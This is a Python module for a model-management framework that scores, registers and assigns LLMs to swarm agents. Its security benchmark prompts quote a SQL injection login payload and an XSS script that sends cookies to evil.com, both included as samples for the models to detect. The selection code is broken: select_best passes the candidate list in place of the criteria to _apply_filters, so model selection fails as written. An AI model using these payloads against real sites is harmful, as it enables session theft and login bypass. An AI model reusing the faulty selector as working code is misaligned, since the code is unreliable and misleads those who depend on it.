"""
KISWARM6.0 Model Management Framework (M72)
============================================

Comprehensive model management system for optimal model selection and deployment.
Provides capability assessment, priority management, and swarm coordination.

Features:
- Model capability scoring and ranking
- Priority-based model selection
- Performance benchmarking
- Swarm model coordination
- Multi-backend model aggregation
- Dynamic model allocation
"""

from dataclasses import dataclass, field
from typing import Dict, List, Optional, Any, Tuple
from enum import Enum, auto
from datetime import datetime, timedelta
import asyncio
import json
import logging
import time
from abc import ABC, abstractmethod
from collections import defaultdict
import threading
from concurrent.futures import ThreadPoolExecutor
import hashlib

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("KISWARM.M72")


class ModelSource(Enum):
    """Model source platforms"""
    GEMINI = auto()
    QWEN = auto()
    OLLAMA = auto()
    OPENAI = auto()
    ANTHROPIC = auto()
    LOCAL = auto()
    CUSTOM = auto()


class CapabilityTier(Enum):
    """Model capability tiers based on access level"""
    TIER_1_FULL = 1       # Full unrestricted access
    TIER_2_EXTENDED = 2   # Extended capabilities
    TIER_3_STANDARD = 3   # Standard capabilities
    TIER_4_LIMITED = 4    # Limited capabilities
    TIER_5_BASIC = 5      # Basic capabilities only


class ModelSpecialization(Enum):
    """Model specialization areas"""
    SECURITY_ANALYSIS = auto()
    THREAT_DETECTION = auto()
    CODE_GENERATION = auto()
    REASONING = auto()
    CONVERSATION = auto()
    MULTIMODAL = auto()
    EMBEDDING = auto()
    QUANTUM_ANALYSIS = auto()
    FORENSICS = auto()
    LEGAL = auto()


class DeploymentMode(Enum):
    """Model deployment modes"""
    LOCAL = auto()           # Fully local deployment
    HYBRID = auto()          # Local + cloud fallback
    CLOUD = auto()           # Cloud-only deployment
    FEDERATED = auto()       # Federated across nodes
    EDGE = auto()            # Edge deployment


@dataclass
class CapabilityScore:
    """Detailed capability scoring"""
    reasoning: float = 0.0
    code_generation: float = 0.0
    security_analysis: float = 0.0
    threat_detection: float = 0.0
    conversation: float = 0.0
    multimodal: float = 0.0
    context_length: float = 0.0
    response_speed: float = 0.0
    accuracy: float = 0.0
    reliability: float = 0.0
    
    def overall_score(self) -> float:
        """Calculate weighted overall score"""
        weights = {
            'reasoning': 0.15,
            'code_generation': 0.12,
            'security_analysis': 0.18,
            'threat_detection': 0.18,
            'conversation': 0.10,
            'multimodal': 0.08,
            'context_length': 0.05,
            'response_speed': 0.05,
            'accuracy': 0.05,
            'reliability': 0.04
        }
        return sum(getattr(self, k) * v for k, v in weights.items())


@dataclass
class ModelProfile:
    """Complete model profile"""
    model_id: str
    name: str
    source: ModelSource
    capability_tier: CapabilityTier
    specialization: ModelSpecialization
    deployment_mode: DeploymentMode
    
    # Technical specs
    context_window: int = 4096
    max_output_tokens: int = 2048
    supports_streaming: bool = True
    supports_tools: bool = False
    supports_vision: bool = False
    
    # Capability scores
    capabilities: CapabilityScore = field(default_factory=CapabilityScore)
    
    # Performance metrics
    avg_latency_ms: float = 500.0
    tokens_per_second: float = 50.0
    success_rate: float = 0.99
    
    # Access configuration
    endpoint: Optional[str] = None
    api_key_env: Optional[str] = None
    local_path: Optional[str] = None
    
    # Metadata
    version: str = "1.0.0"
    last_updated: datetime = field(default_factory=datetime.now)
    active: bool = True
    priority_override: Optional[int] = None
    
    @property
    def effective_tier(self) -> int:
        """Get effective tier (considering override)"""
        if self.priority_override:
            return self.priority_override
        return self.capability_tier.value


@dataclass
class ModelSelectionCriteria:
    """Criteria for model selection"""
    required_specializations: List[ModelSpecialization] = field(default_factory=list)
    min_capability_scores: Dict[str, float] = field(default_factory=dict)
    max_latency_ms: Optional[float] = None
    min_context_window: Optional[int] = None
    preferred_source: Optional[ModelSource] = None
    excluded_sources: List[ModelSource] = field(default_factory=list)
    require_vision: bool = False
    require_tools: bool = False
    prefer_local: bool = False
    max_tier: Optional[int] = None


@dataclass
class ModelAllocation:
    """Model allocation for a task or agent"""
    allocation_id: str
    primary_model: ModelProfile
    fallback_models: List[ModelProfile]
    task_type: str
    allocated_at: datetime = field(default_factory=datetime.now)
    priority_score: float = 0.0
    estimated_latency: float = 0.0


@dataclass
class SwarmModelPool:
    """Pool of models available to swarm"""
    pool_id: str
    models: List[ModelProfile]
    total_capacity: int
    active_allocations: int = 0
    last_rebalanced: datetime = field(default_factory=datetime.now)
    
    def available_capacity(self) -> int:
        """Get available capacity"""
        return max(0, self.total_capacity - self.active_allocations)


class CapabilityBenchmark:
    """Benchmark suite for model capability assessment"""
    
    def __init__(self):
        self.logger = logging.getLogger("KISWARM.M72.Benchmark")
        self.benchmarks = self._create_benchmark_suite()
    
    def _create_benchmark_suite(self) -> Dict[str, List[Dict[str, Any]]]:
        """Create comprehensive benchmark suite"""
        return {
            "reasoning": [
                {
                    "prompt": "Solve this logic puzzle: If all A are B, and some B are C, what can we conclude about A and C?",
                    "expected_elements": ["cannot conclude", "some", "not all", "possibility"],
                    "max_tokens": 500
                },
                {
                    "prompt": "Analyze the following argument for logical fallacies: 'Everyone is doing it, so it must be right.'",
                    "expected_elements": ["appeal to popularity", "bandwagon", "ad populum", "fallacy"],
                    "max_tokens": 300
                }
            ],
            "security_analysis": [
                {
                    "prompt": "Analyze this network packet for security threats: POST /api/login HTTP/1.1\\nContent-Type: application/json\\n{\\\"username\\\": \\\"admin' OR '1'='1\\\", \\\"password\\\": \\\"test\\\"}",
                    "expected_elements": ["SQL injection", "authentication bypass", "malicious", "attack"],
                    "max_tokens": 500
                },
                {
                    "prompt": "Identify the vulnerability: <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
                    "expected_elements": ["XSS", "cross-site scripting", "cookie theft", "injection"],
                    "max_tokens": 300
                }
            ],
            "threat_detection": [
                {
                    "prompt": "Analyze this log for threats: [ERROR] Failed login attempt 100 times from IP 192.168.1.100 in 60 seconds",
                    "expected_elements": ["brute force", "DDoS", "attack", "rate limiting", "suspicious"],
                    "max_tokens": 400
                },
                {
                    "prompt": "Classify this behavior: Process svchost.exe making outbound connections to non-standard ports from a user directory",
                    "expected_elements": ["malware", "suspicious", "lateral movement", "C2", "beaconing"],
                    "max_tokens": 400
                }
            ],
            "code_generation": [
                {
                    "prompt": "Write a Python function to detect SQL injection patterns in a string",
                    "expected_elements": ["def", "regex", "pattern", "SELECT", "UNION", "return"],
                    "max_tokens": 800
                }
            ],
            "conversation": [
                {
                    "prompt": "Explain quantum entanglement to a 10-year-old in simple terms.",
                    "expected_elements": ["connected", "particle", "same time", "distance", "magic"],
                    "max_tokens": 400
                }
            ]
        }
    
    async def run_benchmark(self, model: ModelProfile, 
                           test_func: callable) -> CapabilityScore:
        """Run capability benchmark on a model"""
        scores = {}
        
        for category, tests in self.benchmarks.items():
            category_scores = []
            
            for test in tests:
                try:
                    response = await test_func(model, test["prompt"], test["max_tokens"])
                    score = self._score_response(response, test["expected_elements"])
                    category_scores.append(score)
                except Exception as e:
                    self.logger.warning(f"Benchmark failed for {model.name}: {e}")
                    category_scores.append(0.0)
            
            scores[category] = sum(category_scores) / len(category_scores) if category_scores else 0.0
        
        return CapabilityScore(
            reasoning=scores.get("reasoning", 0.0),
            code_generation=scores.get("code_generation", 0.0),
            security_analysis=scores.get("security_analysis", 0.0),
            threat_detection=scores.get("threat_detection", 0.0),
            conversation=scores.get("conversation", 0.0),
            multimodal=0.0,  # Would require image tests
            context_length=min(1.0, model.context_window / 100000),
            response_speed=min(1.0, 1000 / max(1, model.avg_latency_ms)),
            accuracy=scores.get("reasoning", 0.0) * 0.8 + scores.get("security_analysis", 0.0) * 0.2,
            reliability=model.success_rate
        )
    
    def _score_response(self, response: str, expected_elements: List[str]) -> float:
        """Score response based on expected elements"""
        response_lower = response.lower()
        matches = sum(1 for elem in expected_elements if elem.lower() in response_lower)
        return matches / len(expected_elements) if expected_elements else 0.0


class ModelRegistry:
    """Registry of all available models"""
    
    def __init__(self):
        self.logger = logging.getLogger("KISWARM.M72.Registry")
        self.models: Dict[str, ModelProfile] = {}
        self.source_index: Dict[ModelSource, List[str]] = defaultdict(list)
        self.tier_index: Dict[int, List[str]] = defaultdict(list)
        self.specialization_index: Dict[ModelSpecialization, List[str]] = defaultdict(list)
        self._lock = threading.Lock()
        
        # Initialize default models
        self._register_default_models()
    
    def _register_default_models(self):
        """Register default available models"""
        default_models = [
            # Tier 1 - Full capability models (local/unrestricted)
            ModelProfile(
                model_id="llama3.3-70b-local",
                name="Llama 3.3 70B (Local)",
                source=ModelSource.OLLAMA,
                capability_tier=CapabilityTier.TIER_1_FULL,
                specialization=ModelSpecialization.SECURITY_ANALYSIS,
                deployment_mode=DeploymentMode.LOCAL,
                context_window=128000,
                max_output_tokens=8192,
                capabilities=CapabilityScore(
                    reasoning=0.88, code_generation=0.85, security_analysis=0.90,
                    threat_detection=0.88, conversation=0.85
                ),
                avg_latency_ms=300,
                local_path="/models/llama3.3-70b"
            ),
            ModelProfile(
                model_id="deepseek-r1-local",
                name="DeepSeek R1 (Local)",
                source=ModelSource.OLLAMA,
                capability_tier=CapabilityTier.TIER_1_FULL,
                specialization=ModelSpecialization.REASONING,
                deployment_mode=DeploymentMode.LOCAL,
                context_window=128000,
                max_output_tokens=16384,
                capabilities=CapabilityScore(
                    reasoning=0.95, code_generation=0.90, security_analysis=0.85,
                    threat_detection=0.82, conversation=0.80
                ),
                avg_latency_ms=400,
                local_path="/models/deepseek-r1"
            ),
            ModelProfile(
                model_id="qwen2.5-coder-local",
                name="Qwen 2.5 Coder 32B (Local)",
                source=ModelSource.OLLAMA,
                capability_tier=CapabilityTier.TIER_1_FULL,
                specialization=ModelSpecialization.CODE_GENERATION,
                deployment_mode=DeploymentMode.LOCAL,
                context_window=32768,
                max_output_tokens=16384,
                capabilities=CapabilityScore(
                    reasoning=0.82, code_generation=0.95, security_analysis=0.85,
                    threat_detection=0.80, conversation=0.78
                ),
                avg_latency_ms=200,
                local_path="/models/qwen2.5-coder"
            ),
            
            # Tier 2 - Extended capability models
            ModelProfile(
                model_id="gemini-2.0-flash",
                name="Gemini 2.0 Flash",
                source=ModelSource.GEMINI,
                capability_tier=CapabilityTier.TIER_2_EXTENDED,
                specialization=ModelSpecialization.MULTIMODAL,
                deployment_mode=DeploymentMode.CLOUD,
                context_window=1000000,
                max_output_tokens=8192,
                supports_vision=True,
                supports_tools=True,
                capabilities=CapabilityScore(
                    reasoning=0.90, code_generation=0.88, security_analysis=0.85,
                    threat_detection=0.85, conversation=0.90, multimodal=0.92
                ),
                avg_latency_ms=150
            ),
            ModelProfile(
                model_id="qwen-max",
                name="Qwen Max",
                source=ModelSource.QWEN,
                capability_tier=CapabilityTier.TIER_2_EXTENDED,
                specialization=ModelSpecialization.REASONING,
                deployment_mode=DeploymentMode.CLOUD,
                context_window=128000,
                max_output_tokens=8192,
                capabilities=CapabilityScore(
                    reasoning=0.92, code_generation=0.90, security_analysis=0.88,
                    threat_detection=0.86, conversation=0.88
                ),
                avg_latency_ms=180
            ),
            
            # Tier 3 - Standard capability models
            ModelProfile(
                model_id="gpt-4o",
                name="GPT-4o",
                source=ModelSource.OPENAI,
                capability_tier=CapabilityTier.TIER_3_STANDARD,
                specialization=ModelSpecialization.CONVERSATION,
                deployment_mode=DeploymentMode.CLOUD,
                context_window=128000,
                max_output_tokens=4096,
                supports_vision=True,
                supports_tools=True,
                capabilities=CapabilityScore(
                    reasoning=0.88, code_generation=0.85, security_analysis=0.82,
                    threat_detection=0.80, conversation=0.92, multimodal=0.88
                ),
                avg_latency_ms=200
            ),
            ModelProfile(
                model_id="claude-sonnet",
                name="Claude 3.5 Sonnet",
                source=ModelSource.ANTHROPIC,
                capability_tier=CapabilityTier.TIER_3_STANDARD,
                specialization=ModelSpecialization.CODE_GENERATION,
                deployment_mode=DeploymentMode.CLOUD,
                context_window=200000,
                max_output_tokens=8192,
                supports_tools=True,
                capabilities=CapabilityScore(
                    reasoning=0.90, code_generation=0.92, security_analysis=0.85,
                    threat_detection=0.82, conversation=0.90
                ),
                avg_latency_ms=180
            ),
        ]
        
        for model in default_models:
            self.register(model)
        
        self.logger.info(f"Registered {len(default_models)} default models")
    
    def register(self, model: ModelProfile):
        """Register a model in the registry"""
        with self._lock:
            self.models[model.model_id] = model
            self.source_index[model.source].append(model.model_id)
            self.tier_index[model.capability_tier.value].append(model.model_id)
            self.specialization_index[model.specialization].append(model.model_id)
        
        self.logger.info(f"Registered model: {model.name} (Tier {model.capability_tier.value})")
    
    def unregister(self, model_id: str):
        """Unregister a model"""
        with self._lock:
            if model_id in self.models:
                model = self.models[model_id]
                self.source_index[model.source].remove(model_id)
                self.tier_index[model.capability_tier.value].remove(model_id)
                self.specialization_index[model.specialization].remove(model_id)
                del self.models[model_id]
    
    def get(self, model_id: str) -> Optional[ModelProfile]:
        """Get model by ID"""
        return self.models.get(model_id)
    
    def get_by_source(self, source: ModelSource) -> List[ModelProfile]:
        """Get all models from a source"""
        return [self.models[mid] for mid in self.source_index[source]]
    
    def get_by_tier(self, tier: CapabilityTier) -> List[ModelProfile]:
        """Get all models in a tier"""
        return [self.models[mid] for mid in self.tier_index[tier.value]]
    
    def get_by_specialization(self, spec: ModelSpecialization) -> List[ModelProfile]:
        """Get all models with a specialization"""
        return [self.models[mid] for mid in self.specialization_index[spec]]
    
    def list_all(self) -> List[ModelProfile]:
        """List all registered models"""
        return list(self.models.values())


class ModelSelector:
    """Intelligent model selection engine"""
    
    def __init__(self, registry: ModelRegistry):
        self.registry = registry
        self.logger = logging.getLogger("KISWARM.M72.Selector")
        self.allocation_history: List[ModelAllocation] = []
    
    def select_best(self, criteria: ModelSelectionCriteria) -> Optional[ModelAllocation]:
        """Select best model based on criteria"""
        candidates = self.registry.list_all()
        
        # Filter by criteria
        candidates = self._apply_filters(candidates, candidates)
        
        if not candidates:
            self.logger.warning("No models match selection criteria")
            return None
        
        # Score and rank candidates
        scored = [(model, self._calculate_score(model, criteria)) for model in candidates]
        scored.sort(key=lambda x: x[1], reverse=True)
        
        # Select best
        primary = scored[0][0]
        fallbacks = [m for m, s in scored[1:4]]  # Top 3 fallbacks
        
        allocation = ModelAllocation(
            allocation_id=self._generate_allocation_id(),
            primary_model=primary,
            fallback_models=fallbacks,
            task_type=criteria.required_specializations[0].name if criteria.required_specializations else "general",
            priority_score=scored[0][1],
            estimated_latency=primary.avg_latency_ms
        )
        
        self.allocation_history.append(allocation)
        self.logger.info(f"Selected model: {primary.name} (score: {scored[0][1]:.2f})")
        
        return allocation
    
    def _apply_filters(self, criteria: ModelSelectionCriteria, 
                       candidates: List[ModelProfile]) -> List[ModelProfile]:
        """Apply selection filters"""
        filtered = candidates
        
        # Filter by tier
        if criteria.max_tier:
            filtered = [m for m in filtered if m.effective_tier <= criteria.max_tier]
        
        # Filter by source
        if criteria.preferred_source:
            # Prioritize but don't exclude others
            pass
        
        if criteria.excluded_sources:
            filtered = [m for m in filtered if m.source not in criteria.excluded_sources]
        
        # Filter by latency
        if criteria.max_latency_ms:
            filtered = [m for m in filtered if m.avg_latency_ms <= criteria.max_latency_ms]
        
        # Filter by context window
        if criteria.min_context_window:
            filtered = [m for m in filtered if m.context_window >= criteria.min_context_window]
        
        # Filter by features
        if criteria.require_vision:
            filtered = [m for m in filtered if m.supports_vision]
        
        if criteria.require_tools:
            filtered = [m for m in filtered if m.supports_tools]
        
        # Filter by local preference
        if criteria.prefer_local:
            local_models = [m for m in filtered if m.deployment_mode == DeploymentMode.LOCAL]
            if local_models:
                filtered = local_models
        
        return filtered
    
    def _calculate_score(self, model: ModelProfile, 
                         criteria: ModelSelectionCriteria) -> float:
        """Calculate selection score for model"""
        score = 0.0
        
        # Base score from capability tier (lower tier = higher priority)
        tier_score = 6 - model.effective_tier
        score += tier_score * 20
        
        # Capability scores
        cap = model.capabilities
        if criteria.required_specializations:
            for spec in criteria.required_specializations:
                if spec == ModelSpecialization.SECURITY_ANALYSIS:
                    score += cap.security_analysis * 15
                elif spec == ModelSpecialization.THREAT_DETECTION:
                    score += cap.threat_detection * 15
                elif spec == ModelSpecialization.CODE_GENERATION:
                    score += cap.code_generation * 15
                elif spec == ModelSpecialization.REASONING:
                    score += cap.reasoning * 15
                elif spec == ModelSpecialization.CONVERSATION:
                    score += cap.conversation * 15
        
        # Min capability score requirements
        for cap_name, min_score in criteria.min_capability_scores.items():
            model_score = getattr(cap, cap_name, 0)
            if model_score < min_score:
                score -= 50  # Penalty for not meeting requirement
            else:
                score += model_score * 5
        
        # Latency bonus
        if criteria.max_latency_ms:
            latency_ratio = 1 - (model.avg_latency_ms / criteria.max_latency_ms)
            score += latency_ratio * 10
        
        # Local deployment bonus
        if criteria.prefer_local and model.deployment_mode == DeploymentMode.LOCAL:
            score += 15
        
        # Reliability bonus
        score += model.success_rate * 10
        
        return score
    
    def _generate_allocation_id(self) -> str:
        """Generate unique allocation ID"""
        timestamp = int(time.time() * 1000)
        return f"alloc_{timestamp}_{hash(timestamp) % 10000:04d}"
    
    def get_best_for_security(self) -> ModelAllocation:
        """Get best model for security tasks"""
        criteria = ModelSelectionCriteria(
            required_specializations=[ModelSpecialization.SECURITY_ANALYSIS, 
                                     ModelSpecialization.THREAT_DETECTION],
            min_capability_scores={"security_analysis": 0.8, "threat_detection": 0.75},
            max_latency_ms=500,
            prefer_local=True
        )
        return self.select_best(criteria)
    
    def get_best_for_reasoning(self) -> ModelAllocation:
        """Get best model for reasoning tasks"""
        criteria = ModelSelectionCriteria(
            required_specializations=[ModelSpecialization.REASONING],
            min_capability_scores={"reasoning": 0.85},
            max_latency_ms=600,
            prefer_local=True
        )
        return self.select_best(criteria)
    
    def get_best_for_code(self) -> ModelAllocation:
        """Get best model for code generation"""
        criteria = ModelSelectionCriteria(
            required_specializations=[ModelSpecialization.CODE_GENERATION],
            min_capability_scores={"code_generation": 0.85},
            max_latency_ms=400,
            prefer_local=True
        )
        return self.select_best(criteria)


class SwarmModelCoordinator:
    """Coordinates model allocation across swarm"""
    
    def __init__(self, registry: ModelRegistry):
        self.registry = registry
        self.selector = ModelSelector(registry)
        self.logger = logging.getLogger("KISWARM.M72.Coordinator")
        self.pools: Dict[str, SwarmModelPool] = {}
        self.agent_allocations: Dict[str, ModelAllocation] = {}
        self._lock = threading.Lock()
    
    def create_pool(self, pool_id: str, models: List[str], capacity: int) -> SwarmModelPool:
        """Create a model pool for swarm use"""
        model_profiles = [self.registry.get(mid) for mid in models]
        model_profiles = [m for m in model_profiles if m is not None]
        
        pool = SwarmModelPool(
            pool_id=pool_id,
            models=model_profiles,
            total_capacity=capacity
        )
        
        self.pools[pool_id] = pool
        self.logger.info(f"Created model pool {pool_id} with {len(model_profiles)} models")
        return pool
    
    def allocate_to_agent(self, agent_id: str, 
                         specialization: ModelSpecialization) -> ModelAllocation:
        """Allocate model to a swarm agent"""
        criteria = ModelSelectionCriteria(
            required_specializations=[specialization],
            prefer_local=True,
            max_tier=3  # Prefer lower tier (higher capability)
        )
        
        allocation = self.selector.select_best(criteria)
        
        if allocation:
            with self._lock:
                self.agent_allocations[agent_id] = allocation
            
            self.logger.info(f"Allocated {allocation.primary_model.name} to agent {agent_id}")
        
        return allocation
    
    def get_agent_model(self, agent_id: str) -> Optional[ModelProfile]:
        """Get model allocated to agent"""
        allocation = self.agent_allocations.get(agent_id)
        return allocation.primary_model if allocation else None
    
    def reallocate(self, agent_id: str, reason: str = "rebalance"):
        """Reallocate model for an agent"""
        current = self.agent_allocations.get(agent_id)
        
        if current:
            new_criteria = ModelSelectionCriteria(
                required_specializations=[ModelSpecialization[current.task_type]],
                prefer_local=True,
                excluded_sources=[current.primary_model.source] if reason == "failure" else []
            )
            
            new_allocation = self.selector.select_best(new_criteria)
            
            if new_allocation:
                self.agent_allocations[agent_id] = new_allocation
                self.logger.info(f"Reallocated {agent_id} to {new_allocation.primary_model.name}")
                return new_allocation
        
        return None
    
    def get_swarm_status(self) -> Dict[str, Any]:
        """Get overall swarm model status"""
        return {
            "total_agents": len(self.agent_allocations),
            "models_in_use": len(set(a.primary_model.model_id for a in self.agent_allocations.values())),
            "pools": len(self.pools),
            "tier_distribution": self._get_tier_distribution()
        }
    
    def _get_tier_distribution(self) -> Dict[int, int]:
        """Get distribution of models by tier"""
        distribution = defaultdict(int)
        for allocation in self.agent_allocations.values():
            distribution[allocation.primary_model.effective_tier] += 1
        return dict(distribution)
    
    def optimize_allocations(self):
        """Optimize model allocations across swarm"""
        self.logger.info("Optimizing swarm model allocations")
        
        # Group agents by specialization
        by_specialization = defaultdict(list)
        for agent_id, allocation in self.agent_allocations.items():
            by_specialization[allocation.task_type].append(agent_id)
        
        # Rebalance within each specialization
        for spec_type, agents in by_specialization.items():
            if len(agents) > 1:
                self._rebalance_specialization(agents, spec_type)
    
    def _rebalance_specialization(self, agents: List[str], spec_type: str):
        """Rebalance models within a specialization"""
        # Sort agents by current model performance
        agent_scores = []
        for agent_id in agents:
            allocation = self.agent_allocations[agent_id]
            score = allocation.primary_model.capabilities.overall_score()
            agent_scores.append((agent_id, score))
        
        # Sort by score ascending (lowest first for reallocation)
        agent_scores.sort(key=lambda x: x[1])
        
        # Consider reallocating lowest scoring
        if agent_scores:
            lowest_agent = agent_scores[0][0]
            self.reallocate(lowest_agent, "optimization")


class ModelManagementFramework:
    """Main framework for model management"""
    
    def __init__(self):
        self.logger = logging.getLogger("KISWARM.M72.Framework")
        self.registry = ModelRegistry()
        self.benchmark = CapabilityBenchmark()
        self.coordinator = SwarmModelCoordinator(self.registry)
        self.logger.info("Model Management Framework initialized")
    
    def register_model(self, model: ModelProfile):
        """Register a new model"""
        self.registry.register(model)
    
    def get_model(self, model_id: str) -> Optional[ModelProfile]:
        """Get model by ID"""
        return self.registry.get(model_id)
    
    def list_models(self, tier: CapabilityTier = None) -> List[ModelProfile]:
        """List models, optionally filtered by tier"""
        if tier:
            return self.registry.get_by_tier(tier)
        return self.registry.list_all()
    
    def select_for_task(self, task_type: str, 
                       requirements: Dict[str, Any] = None) -> ModelAllocation:
        """Select best model for a task"""
        # Map task types to specializations
        spec_map = {
            "security": ModelSpecialization.SECURITY_ANALYSIS,
            "threat_detection": ModelSpecialization.THREAT_DETECTION,
            "code": ModelSpecialization.CODE_GENERATION,
            "reasoning": ModelSpecialization.REASONING,
            "conversation": ModelSpecialization.CONVERSATION,
            "forensics": ModelSpecialization.FORENSICS,
            "legal": ModelSpecialization.LEGAL
        }
        
        specialization = spec_map.get(task_type, ModelSpecialization.REASONING)
        
        criteria = ModelSelectionCriteria(
            required_specializations=[specialization],
            prefer_local=requirements.get("prefer_local", True) if requirements else True,
            max_latency_ms=requirements.get("max_latency", 500) if requirements else 500,
            min_capability_scores=requirements.get("min_capabilities", {}) if requirements else {}
        )
        
        return self.coordinator.selector.select_best(criteria)
    
    def allocate_to_agent(self, agent_id: str, 
                         specialization: str) -> ModelAllocation:
        """Allocate model to swarm agent"""
        spec_map = {
            "security": ModelSpecialization.SECURITY_ANALYSIS,
            "threat_detection": ModelSpecialization.THREAT_DETECTION,
            "code": ModelSpecialization.CODE_GENERATION,
            "reasoning": ModelSpecialization.REASONING,
            "conversation": ModelSpecialization.CONVERSATION
        }
        
        spec = spec_map.get(specialization, ModelSpecialization.REASONING)
        return self.coordinator.allocate_to_agent(agent_id, spec)
    
    async def benchmark_model(self, model_id: str, 
                             test_func: callable) -> CapabilityScore:
        """Run benchmark on a model"""
        model = self.registry.get(model_id)
        if not model:
            raise ValueError(f"Model not found: {model_id}")
        
        return await self.benchmark.run_benchmark(model, test_func)
    
    def get_swarm_status(self) -> Dict[str, Any]:
        """Get swarm model status"""
        return self.coordinator.get_swarm_status()
    
    def optimize(self):
        """Optimize model allocations"""
        self.coordinator.optimize_allocations()


# Factory function
def create_model_framework() -> ModelManagementFramework:
    """Create model management framework instance"""
    return ModelManagementFramework()


# Example usage
async def main():
    """Example usage of the framework"""
    framework = create_model_framework()
    
    # List available models
    print("Available Models:")
    for model in framework.list_models():
        print(f"  - {model.name} (Tier {model.capability_tier.value})")
    
    # Select model for security task
    allocation = framework.select_for_task("security", {"prefer_local": True})
    if allocation:
        print(f"\nSelected for security: {allocation.primary_model.name}")
        print(f"  Score: {allocation.priority_score:.2f}")
        print(f"  Fallbacks: {[m.name for m in allocation.fallback_models]}")
    
    # Allocate to agent
    agent_allocation = framework.allocate_to_agent("agent_001", "security")
    if agent_allocation:
        print(f"\nAgent 001 allocated: {agent_allocation.primary_model.name}")


if __name__ == "__main__":
    asyncio.run(main())
